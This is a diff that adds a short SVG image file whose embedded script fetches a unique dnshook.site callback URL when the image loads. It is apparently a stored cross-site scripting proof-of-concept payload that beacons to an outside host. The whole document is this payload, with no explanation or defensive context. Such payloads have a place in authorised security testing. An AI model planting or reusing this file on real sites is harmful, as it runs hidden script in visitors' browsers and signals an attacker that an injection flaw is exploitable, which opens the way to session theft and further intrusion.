@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch("https://a30f445e-1798-4412-96ad-7dd7289c9a2c.dnshook.site")
+      .then(r => console.log("sent"))
+      .catch(e => console.log(e));
+  </script>
+</svg>
